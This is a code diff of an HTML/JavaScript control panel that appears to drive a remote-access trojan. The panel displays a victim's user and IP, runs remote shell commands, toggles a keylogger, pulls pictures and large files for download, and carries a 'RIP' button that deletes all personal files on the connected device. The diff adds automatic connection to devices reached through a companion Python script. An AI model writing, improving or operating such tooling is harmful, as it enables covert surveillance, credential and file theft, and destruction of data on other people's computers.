@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Control</title>
+    <title>Auto-Connect System Control</title>
     <style>
         * {
             margin: 0;
@@ -15,42 +15,71 @@
             background: #0a0a0a;
             color: #00ff00;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             padding: 20px;
         }
         .container {
-            max-width: 900px;
-            width: 100%;
-            background: #111;
-            border: 2px solid #00ff00;
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 0 50px rgba(0, 255, 0, 0.1);
+            max-width: 1200px;
+            margin: 0 auto;
         }
-        .header {
-            text-align: center;
-            border-bottom: 1px solid #00ff0033;
-            padding-bottom: 20px;
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
             margin-bottom: 20px;
+            background: #111;
+            padding: 20px;
+            border-radius: 15px;
+            border: 1px solid #00ff0033;
         }
-        .header h1 {
-            font-size: 32px;
-            letter-spacing: 4px;
-            text-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+        .top-bar h1 {
+            font-size: 24px;
+            letter-spacing: 2px;
         }
-        .header .status {
-            color: #888;
-            font-size: 14px;
-            margin-top: 10px;
+        .top-bar .status-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
-        .header .status span {
+        .auto-connect-banner {
+            background: #00ff0011;
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
             color: #00ff00;
+            font-size: 14px;
+        }
+        .auto-connect-banner .url {
+            color: #00aaff;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        .device-selector {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .device-selector select {
+            background: #1a1a1a;
+            color: #00ff00;
+            border: 1px solid #00ff0044;
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 14px;
+            cursor: pointer;
+            min-width: 200px;
+        }
+        .device-selector select:focus {
+            outline: none;
+            border-color: #00ff00;
         }
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
             gap: 12px;
             margin: 20px 0;
         }
@@ -96,11 +125,6 @@
         .btn.success:hover {
             background: #00ff8822;
             border-color: #00ff88;
-        }
-        .btn:disabled {
-            opacity: 0.3;
-            cursor: not-allowed;
-            transform: none !important;
         }
         .section {
             margin: 20px 0;
@@ -204,6 +228,7 @@
         .file-item .name {
             color: #00ff88;
             font-family: monospace;
+            word-break: break-all;
         }
         .file-item .download-link {
             color: #00aaff;
@@ -213,22 +238,11 @@
             border: 1px solid #00aaff44;
             border-radius: 4px;
             transition: all 0.3s;
+            white-space: nowrap;
         }
         .file-item .download-link:hover {
             background: #00aaff22;
             border-color: #00aaff;
-        }
-        .loading {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #00ff0044;
-            border-top: 2px solid #00ff00;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
         }
         .modal {
             display: none;
@@ -256,43 +270,48 @@
         .modal-content h2 {
             margin-bottom: 15px;
         }
-        .modal-content .input-group {
-            margin: 15px 0;
-        }
-        .modal-content .btn {
-            width: 100%;
-            margin-top: 10px;
-        }
         @media (max-width: 600px) {
             .container {
-                padding: 15px;
+                padding: 10px;
             }
             .grid {
-                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+                grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
             }
-            .header h1 {
-                font-size: 22px;
+            .top-bar {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .device-selector {
+                flex-direction: column;
+            }
+            .device-selector select {
+                width: 100%;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container" id="app">
-        <div class="header">
-            <h1>🖥️ SYSTEM CONTROL</h1>
-            <div class="status">
-                Status: <span id="statusText">Connecting...</span>
-                <span style="margin-left:20px;">IP: <span id="ipDisplay">-</span></span>
+    <div class="container">
+        <div class="top-bar">
+            <h1>🖥️ AUTO-CONNECT CONTROL</h1>
+            <div class="status-badge">
+                <span id="connectionStatus" style="color:#ffaa00;">🟡 Connecting...</span>
             </div>
         </div>
 
-        <!-- Info Bar -->
+        <!-- Auto-Connect Banner -->
+        <div class="auto-connect-banner">
+            🤖 <strong>Auto-Connect Active</strong> — Device will automatically connect when the Python script runs
+            <br><small>URL: <span class="url" id="deviceUrlDisplay">Waiting for connection...</span></small>
+        </div>
+
+        <!-- Device Info -->
         <div class="info-bar" id="infoBar">
+            <div class="item"><span class="label">Device:</span> <span class="value" id="deviceNameDisplay">-</span></div>
             <div class="item"><span class="label">User:</span> <span class="value" id="userDisplay">-</span></div>
-            <div class="item"><span class="label">PC:</span> <span class="value" id="pcDisplay">-</span></div>
-            <div class="item"><span class="label">OS:</span> <span class="value" id="osDisplay">-</span></div>
-            <div class="item"><span class="label">Drives:</span> <span class="value" id="drivesDisplay">-</span></div>
+            <div class="item"><span class="label">IP:</span> <span class="value" id="ipDisplay">-</span></div>
             <div class="item"><span class="label">Keylogger:</span> <span class="value" id="keyloggerStatus">OFF</span></div>
+            <div class="item"><span class="label">Files:</span> <span class="value" id="fileCount">0</span></div>
         </div>
 
         <!-- Main Grid -->
@@ -307,14 +326,12 @@
             <button class="btn" onclick="executeAction('pics')">🖼️ Pictures</button>
             <button class="btn" onclick="executeAction('large_files')">📂 Large Files</button>
             <button class="btn success" onclick="toggleKeylogger()">⌨️ Keylogger</button>
-            <button class="btn" onclick="executeAction('browse')">📁 Browse</button>
             <button class="btn warning" onclick="showRipModal()">💀 RIP</button>
-            <button class="btn danger" onclick="executeAction('end_session')">🔚 End Session</button>
         </div>
 
         <!-- Command Input -->
         <div class="section">
-            <div class="section-title">💻 Command Line</div>
+            <div class="section-title">💻 COMMAND LINE</div>
             <div class="input-group">
                 <input type="text" id="cmdInput" placeholder="Enter command..." onkeydown="if(event.key==='Enter') executeCommand()">
                 <button class="btn" onclick="executeCommand()" style="padding:10px 20px;">Run</button>
@@ -324,13 +341,13 @@
 
         <!-- Output -->
         <div class="section">
-            <div class="section-title">📋 Output</div>
+            <div class="section-title">📋 OUTPUT</div>
             <div class="output" id="output">Ready...</div>
         </div>
 
         <!-- Downloads -->
         <div class="section" id="downloadSection">
-            <div class="section-title">📥 Available Downloads</div>
+            <div class="section-title">📥 DOWNLOADS</div>
             <div id="downloadList" class="file-list">
                 <div style="color:#444;text-align:center;padding:20px;">No files available</div>
             </div>
@@ -341,7 +358,7 @@
     <div class="modal" id="ripModal">
         <div class="modal-content">
             <h2 style="color:#ff0000;">⚠️ CONFIRM RIP</h2>
-            <p style="color:#888;margin:15px 0;">This will delete all personal files. This action is irreversible!</p>
+            <p style="color:#888;margin:15px 0;">This will delete all personal files on the selected device!</p>
             <p style="color:#ff4444;font-size:12px;">Type "CONFIRM_RIP" to proceed</p>
             <div class="input-group">
                 <input type="text" id="ripInput" placeholder="Type CONFIRM_RIP" style="flex:1;background:#1a1a1a;border:1px solid #ff000044;border-radius:10px;padding:12px 15px;color:#ff0000;font-size:14px;">
@@ -352,50 +369,111 @@
     </div>
 
     <script>
-        // Configuration
-        let SERVER_URL = new URLSearchParams(window.location.search).get('server') || 'http://localhost:8080';
+        // ==================== AUTO-CONNECT ====================
+        let serverUrl = null;
         let statusInterval = null;
         let downloadInterval = null;
-        let currentFileList = [];
+        let reconnectAttempts = 0;
+        const MAX_RECONNECT_ATTEMPTS = 10;
 
-        // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            updateStatus();
+            // Check URL for auto-connect parameters
+            const params = new URLSearchParams(window.location.search);
+            const autoServer = params.get('server');
+            const deviceName = params.get('device') || 'Unknown';
+            
+            if (autoServer) {
+                serverUrl = autoServer;
+                document.getElementById('deviceUrlDisplay').textContent = autoServer;
+                document.getElementById('deviceNameDisplay').textContent = deviceName;
+                connectToDevice(autoServer);
+            } else {
+                // Try to auto-detect from local storage
+                const savedDevices = JSON.parse(localStorage.getItem('autoDevices') || '{}');
+                const deviceUrls = Object.keys(savedDevices);
+                if (deviceUrls.length > 0) {
+                    serverUrl = deviceUrls[0];
+                    document.getElementById('deviceUrlDisplay').textContent = serverUrl;
+                    document.getElementById('deviceNameDisplay').textContent = savedDevices[serverUrl] || 'Unknown';
+                    connectToDevice(serverUrl);
+                } else {
+                    document.getElementById('connectionStatus').textContent = '🔴 No device connected';
+                    document.getElementById('connectionStatus').style.color = '#ff0000';
+                    document.getElementById('output').textContent = '❌ No device found. Run the Python script first.';
+                }
+            }
+            
             statusInterval = setInterval(updateStatus, 3000);
             downloadInterval = setInterval(updateDownloads, 2000);
-            document.getElementById('ipDisplay').textContent = SERVER_URL.replace('http://', '').split(':')[0];
         });
 
-        // Update system status
+        function connectToDevice(url) {
+            document.getElementById('connectionStatus').textContent = '🟡 Connecting...';
+            document.getElementById('connectionStatus').style.color = '#ffaa00';
+            
+            fetch(`${url}/device/info`)
+                .then(response => {
+                    if (!response.ok) throw new Error('Device offline');
+                    return response.json();
+                })
+                .then(data => {
+                    document.getElementById('connectionStatus').textContent = '🟢 Connected';
+                    document.getElementById('connectionStatus').style.color = '#00ff00';
+                    document.getElementById('deviceNameDisplay').textContent = data.name || url;
+                    document.getElementById('userDisplay').textContent = data.username || '-';
+                    document.getElementById('ipDisplay').textContent = data.ip || '-';
+                    document.getElementById('keyloggerStatus').textContent = data.keylogger ? '🟢 ON' : '⚫ OFF';
+                    document.getElementById('keyloggerStatus').style.color = data.keylogger ? '#00ff00' : '#666';
+                    document.getElementById('output').textContent = `✅ Connected to ${data.name || url}`;
+                    reconnectAttempts = 0;
+                    updateDownloads();
+                })
+                .catch(error => {
+                    document.getElementById('connectionStatus').textContent = '🔴 Offline';
+                    document.getElementById('connectionStatus').style.color = '#ff0000';
+                    document.getElementById('output').textContent = `❌ Connection failed: ${error.message}`;
+                    
+                    // Auto-reconnect
+                    reconnectAttempts++;
+                    if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
+                        setTimeout(() => connectToDevice(url), 5000);
+                    }
+                });
+        }
+
+        // ==================== STATUS UPDATES ====================
         async function updateStatus() {
+            if (!serverUrl) return;
+            
             try {
-                const response = await fetch(`${SERVER_URL}/status`);
-                if (!response.ok) throw new Error('Server offline');
+                const response = await fetch(`${serverUrl}/status`);
+                if (!response.ok) throw new Error('Device offline');
                 const data = await response.json();
                 
-                document.getElementById('statusText').textContent = '🟢 Online';
-                document.getElementById('statusText').style.color = '#00ff00';
+                document.getElementById('connectionStatus').textContent = '🟢 Connected';
+                document.getElementById('connectionStatus').style.color = '#00ff00';
                 
                 if (data.system_info) {
                     document.getElementById('userDisplay').textContent = data.system_info.username || '-';
-                    document.getElementById('pcDisplay').textContent = data.system_info.pc_name || '-';
-                    document.getElementById('osDisplay').textContent = data.system_info.os || '-';
-                    document.getElementById('drivesDisplay').textContent = (data.system_info.drives || []).join(' ') || '-';
+                    document.getElementById('ipDisplay').textContent = data.system_info.ip || '-';
                 }
                 
                 document.getElementById('keyloggerStatus').textContent = data.keylogger_active ? '🟢 ON' : '⚫ OFF';
                 document.getElementById('keyloggerStatus').style.color = data.keylogger_active ? '#00ff00' : '#666';
+                document.getElementById('fileCount').textContent = data.pending_downloads || 0;
                 
             } catch (error) {
-                document.getElementById('statusText').textContent = '🔴 Offline';
-                document.getElementById('statusText').style.color = '#ff0000';
+                document.getElementById('connectionStatus').textContent = '🔴 Offline';
+                document.getElementById('connectionStatus').style.color = '#ff0000';
             }
         }
 
-        // Update downloads list
+        // ==================== DOWNLOADS ====================
         async function updateDownloads() {
+            if (!serverUrl) return;
+            
             try {
-                const response = await fetch(`${SERVER_URL}/files`);
+                const response = await fetch(`${serverUrl}/files`);
                 if (!response.ok) return;
                 const files = await response.json();
                 const fileIds = Object.keys(files);
@@ -410,22 +488,28 @@
                     html += `
                         <div class="file-item">
                             <span class="name">📄 ${name}</span>
-                            <a href="${SERVER_URL}/${id}" class="download-link" download>⬇ Download</a>
+                            <a href="${serverUrl}/${id}" class="download-link" download>⬇ Download</a>
                         </div>
                     `;
                 }
                 document.getElementById('downloadList').innerHTML = html;
+                document.getElementById('fileCount').textContent = fileIds.length;
             } catch (error) {
                 // Silent fail
             }
         }
 
-        // Execute action
+        // ==================== ACTIONS ====================
         async function executeAction(action) {
-            setOutput(`⏳ Executing ${action}...`);
+            if (!serverUrl) {
+                document.getElementById('output').textContent = '❌ No device connected';
+                return;
+            }
+            
+            document.getElementById('output').textContent = `⏳ Executing ${action}...`;
             
             try {
-                const response = await fetch(`${SERVER_URL}/action`, {
+                const response = await fetch(`${serverUrl}/action`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ action: action })
@@ -433,58 +517,66 @@
                 
                 const result = await response.json();
                 if (result.success) {
-                    setOutput(`✅ ${action} completed!\n${result.message || ''}`);
+                    document.getElementById('output').textContent = `✅ ${action} completed!\n${result.message || ''}`;
                     if (result.download_id) {
-                        addNotification(`File ready for download: ${result.filename}`);
+                        document.getElementById('output').textContent += `\n📥 Download: ${serverUrl}/${result.download_id}`;
                     }
                 } else {
-                    setOutput(`❌ Error: ${result.error || 'Unknown error'}`);
+                    document.getElementById('output').textContent = `❌ Error: ${result.error || 'Unknown error'}`;
                 }
             } catch (error) {
-                setOutput(`❌ Connection error: ${error.message}`);
+                document.getElementById('output').textContent = `❌ Connection error: ${error.message}`;
             }
             
             await updateDownloads();
         }
 
-        // Execute command
         async function executeCommand() {
+            if (!serverUrl) {
+                document.getElementById('output').textContent = '❌ No device connected';
+                return;
+            }
+            
             const input = document.getElementById('cmdInput');
             const command = input.value.trim();
             if (!command) return;
             
-            setOutput(`⏳ Running: ${command}\n`);
+            document.getElementById('output').textContent = `⏳ Running: ${command}\n`;
             input.value = '';
             
             try {
-                const response = await fetch(`${SERVER_URL}/command`, {
+                const response = await fetch(`${serverUrl}/command`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ command: command })
                 });
                 
                 const result = await response.json();
-                setOutput(`$ ${command}\n${result.output || 'Done'}`);
+                document.getElementById('output').textContent = `$ ${command}\n${result.output || 'Done'}`;
             } catch (error) {
-                setOutput(`❌ Connection error: ${error.message}`);
+                document.getElementById('output').textContent = `❌ Connection error: ${error.message}`;
             }
         }
 
-        // Toggle keylogger
         async function toggleKeylogger() {
+            if (!serverUrl) {
+                document.getElementById('output').textContent = '❌ No device connected';
+                return;
+            }
+            
             try {
-                const response = await fetch(`${SERVER_URL}/keylogger/toggle`, {
+                const response = await fetch(`${serverUrl}/keylogger/toggle`, {
                     method: 'POST'
                 });
                 const result = await response.json();
-                setOutput(`⌨️ Keylogger ${result.active ? 'STARTED' : 'STOPPED'}`);
+                document.getElementById('output').textContent = `⌨️ Keylogger ${result.active ? 'STARTED' : 'STOPPED'}`;
                 updateStatus();
             } catch (error) {
-                setOutput(`❌ Error: ${error.message}`);
+                document.getElementById('output').textContent = `❌ Error: ${error.message}`;
             }
         }
 
-        // Show RIP modal
+        // ==================== RIP ====================
         function showRipModal() {
             document.getElementById('ripModal').classList.add('active');
             document.getElementById('ripInput').value = '';
@@ -495,41 +587,28 @@
             document.getElementById('ripModal').classList.remove('active');
         }
 
-        // Execute RIP
         async function executeRip() {
             const input = document.getElementById('ripInput');
             if (input.value.trim() !== 'CONFIRM_RIP') {
-                setOutput('❌ Incorrect confirmation. Type CONFIRM_RIP exactly.');
+                document.getElementById('output').textContent = '❌ Incorrect confirmation. Type CONFIRM_RIP exactly.';
                 return;
             }
             
             closeRipModal();
-            setOutput('💀 RIP MODE ACTIVATED - DELETING ALL FILES...');
+            document.getElementById('output').textContent = '💀 RIP MODE ACTIVATED - DELETING ALL FILES...';
             
             try {
-                const response = await fetch(`${SERVER_URL}/rip`, {
+                const response = await fetch(`${serverUrl}/rip`, {
                     method: 'POST'
                 });
                 const result = await response.json();
-                setOutput(`💀 ${result.message || 'RIP complete'}`);
+                document.getElementById('output').textContent = `💀 ${result.message || 'RIP complete'}`;
             } catch (error) {
-                setOutput(`❌ Error: ${error.message}`);
+                document.getElementById('output').textContent = `❌ Error: ${error.message}`;
             }
         }
 
-        // Set output
-        function setOutput(text) {
-            const output = document.getElementById('output');
-            output.textContent = text;
-            output.scrollTop = output.scrollHeight;
-        }
-
-        // Add notification
-        function addNotification(text) {
-            setOutput(text + '\n\n' + document.getElementById('output').textContent);
-        }
-
-        // Cleanup on page unload
+        // Cleanup
         window.addEventListener('beforeunload', function() {
             if (statusInterval) clearInterval(statusInterval);
             if (downloadInterval) clearInterval(downloadInterval);
